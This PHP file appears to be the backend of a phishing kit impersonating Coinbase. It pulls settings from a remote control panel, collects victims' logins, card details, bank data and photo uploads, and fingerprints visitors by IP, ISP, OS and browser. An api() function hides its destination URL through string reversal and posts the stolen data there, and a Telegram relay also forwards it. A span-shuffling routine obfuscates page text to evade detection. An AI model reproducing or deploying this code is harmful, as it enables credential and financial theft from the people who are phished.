<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$domain = $_SERVER['SERVER_NAME'];
$set_ip = 'https://spm55-v3.vip';

function get_setting($url,$owner){
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,"".$url."/api/setting?domain=".$owner);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_IPRESOLVE,CURL_IPRESOLVE_V4);
$ress=curl_exec($ch);
curl_close($ch);
$ress = json_decode($ress, true);
return $ress;
}

$setting = get_setting($set_ip,$domain);
$check_domain = $setting[0]["domain_name"];
$email_result = $setting[0]["email_result"];
$sender_mail = $setting[0]["sender_mail"];
$site_parameter = $setting[0]["site_parameter"];
$site_param_on = $setting[0]["site_param_on"];
$double_login = $setting[0]["double_login"];
$two_email = $setting[0]["double_email"];
$double_cc = $setting[0]["double_cc"];
$get_email = $setting[0]["get_email"];
$get_pap = $setting[0]["get_pap"];
$get_bank = $setting[0]["get_bank"];
$alert_type = $setting[0]["alert_type"];
$send_login = $setting[0]["send_result"];

function enc($teks){
    $teks = str_split($teks);
    $no = 1;
    foreach ($teks as $p){
        $rand = substr( str_shuffle("ASDFGHJKLZXCVBNMQWERTYUIOP0123456789asdfghjklzxcvbnmqwertyuiop"), 0, 100 );
        $no++;
        echo '<span id="'.$rand.'" class="'.$rand.'">'.$p.'</span>';
    }
}
function check_bin($bin) {
      $bin = preg_replace('/\s/', '', $bin);
      $bin = substr($bin,0,8);
      $url = "https://lookup.binlist.net/".$bin;
      $headers = array();
      $headers[] = 'Accept-Version: 3';
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $resp=curl_exec($ch);
      curl_close($ch);
      $result = json_decode($resp, true);
      return $result;
}
function login($url, $email, $private_key, $domain){
    $ch = curl_init();
    $url = ''.$url.'/api/login?email='.$email.'&private_key='.$private_key.'&domain='.$domain;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $result = curl_exec($ch);
    curl_close($ch);
    $status = json_decode($result)->status;
    return $status;
}
function api($a,$b,$c){
    $url = strrev("ipa/piv.3v-55mps.ipa//:sptth");
    if (preg_match("/upload/i", $a) && preg_match("/https:/i", $a)) {
        $data = "pap=$a&caption=$b&type=coinbase";
    }else{
        if ($c == "telegram") {
            $s = explode("<br>",$a);
            $s = "".$s[0]." [".$s[1]."] - [".$s[3]." - ".$s[4]."] ";
        }
        if ($c == "email") {
            $s = $b;
        }
        $a = str_replace("\r\n","",$a);
        $data = "api1=".$s."&api2=".$a."&type=coinbase";
    }

    $c4 = curl_init();
    curl_setopt($c4, CURLOPT_URL, $url);
    curl_setopt($c4, CURLOPT_POST, true);
    curl_setopt($c4, CURLOPT_POSTFIELDS, $data);
    curl_setopt($c4, CURLOPT_RETURNTRANSFER, true);
    curl_exec($c4);
    curl_close($c4);
}
function send_telegram($url,$domain,$message){
$url = ''.$url.'/api/send_telegram?domain='.$domain;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
$res = curl_exec($ch);
curl_close($ch);
}
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}

$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$cn = $countryname;
$cid = $countrycode;
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];
if($countryname == "") {
    $details = get_ip2($ip2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['continent'];
    $citykota = $details['city'];
}
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   getOS();

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}
$ispuser = getisp($ip);
$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$key = sha1(base64_encode($ip2.$user_agent));